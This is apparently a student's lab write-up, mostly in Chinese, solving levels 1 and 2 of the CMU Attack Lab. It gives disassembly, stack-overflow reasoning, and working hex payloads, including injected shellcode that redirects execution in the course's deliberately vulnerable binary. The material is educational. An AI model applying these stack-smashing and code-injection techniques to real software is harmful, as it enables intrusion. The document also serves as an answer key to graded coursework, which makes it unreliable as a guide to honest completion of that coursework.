# Attack Lab實驗紀錄

## Intro

This file contains materials for one instance of the **attacklab**.

Files:

```bash
ctarget
```

Linux binary with code-injection vulnerability.  To be used for phases
1-3 of the assignment.

    rtarget

Linux binary with return-oriented programming vulnerability.  To be
used for phases 4-5 of the assignment.

```bash
 cookie.txt
```

Text file containing 4-byte signature required for this lab instance.

```bash
 farm.c
```

Source code for gadget farm present in this instance of `rtarget`.  You
can compile (use flag `-Og`) and disassemble it to look for gadgets.

```bash
 hex2raw
```

Utility program to generate byte sequences.  See documentation in lab
handout.

> 開始實驗前請先閱讀attacklab.pdf文檔

## Part I: Code Injection Attacks

### Level 1

Level 1的目的是對`test`進行注入攻擊，將原先`ret`返回地址的導向`touch1()`函式

先查看原先的程式碼:

```c
void test(){
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

然後我們看看`getbuf()`的實現，其實他的功能類似於`gets()`，直到遇上`\n`或`EOF`停止，這點適合我們進行攻擊

```c
unsigned getbuf(){
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

透過`./ctarget -q`執行`ctarget`後藉由輸入字串進行注入攻擊

```c
void touch1(){
    vlevel = 1;
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

使用`objdump -d ./ctarget > ctarget.s`反組譯`catarget`

`test()`的組合語言程式碼:

```asm
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq 
```

`getbuf()`的組合語言程式碼:

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq 
```

`touch1()`的組合語言程式碼:

```asm
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

從上面的結果不難推測出，最終要將返回地址複寫成`0x 00 00 00 00 00 40 17 c0`，此處要特別注意機器是大端還是小端

所以調用`getbuf()`後棧的狀態類似:

![](https://raw.githubusercontent.com/WeiLin66/pictures/main/202207230811203.png)



我們需要填充40個任意字元，然後再依序填入`c0 17 40 00 00 00 00 00`

官方文件有提到`HEX2TRAW`可以將文件中的hex值轉換成字元(用空白鍵區分)，然後將字串內容輸入給`ctarget`。因此只需要將

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

另存成`touch1.txt`(名字自己取)，然後執行`./hex2raw < touch1.txt | ./ctarget -q`語句就可以了

```
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

### Level 2

Level 2不僅要我們進行注入攻擊，還需要傳入參數`val`來達到特殊目的

首先我們來看`touch2`的C與asm程式碼，需要使得條件`val == cookie`成立，才能成功通過

>  `cookie`位於檔案cookie.txt中，其值為`0x59b997fa`

```c
void touch2(unsigned val){
    vlevel = 2;
    if(val == cookie){
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    }else{
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

```asm
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```

有此可知，我們可以總結出:

- 不能直接跳轉到`touch2`
- 需要修改`%rdi`值(首參數)
- 需要在將程式碼透過字串方式注入到棧分配的空間中
- 需要知道程式碼的字節碼型式

首先，我們需要知道返回地址前的`%rsp`地址，目的是為了知道輸入字串的儲存位置

透過`gdb ./ctarget`進行gdb除錯，然後`b main` ,`b test`上斷點後執行`r -q`開始跟蹤代碼。進入`getbuf()`函式，並打印其暫存器資訊，可以發現棧地址的變化`0x5561dca0` &rarr; `0x5561dc78`

因此我們可以在棧中設計整個攻擊流程: **反回到原先棧分配的空間中，執行我們注入的程式碼，最後再返回**`touch2`

![](https://raw.githubusercontent.com/WeiLin66/pictures/main/202207230831869.png)





有了這個向法，就可以清楚的設計注入程式碼:

```asm
movl $0x59b997fa, %edi
pushq $0x4017ec
ret
```

將上述程式碼儲存成`test.s`然後透過組譯再反組譯得到字節碼

- `gcc -c test.s`
- `objdump -d test.s > test.d`

```
test.o      檔案格式 elf64-x86-64


.text 區段的反組譯：

0000000000000000 <.text>:
   0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
   5:	68 ec 17 40 00       	pushq  $0x4017ec
   a:	c3                   	retq   
```

```
bf fa 97 b9 59 68 ec 17 
40 00 c3 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

最後只要將字節碼寫入`touch2.txt`中，然後`./hex2raw < touch2.txt | ./ctarget -q`執行就可以了

> 注意地址與字節碼的順序

```
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 

```

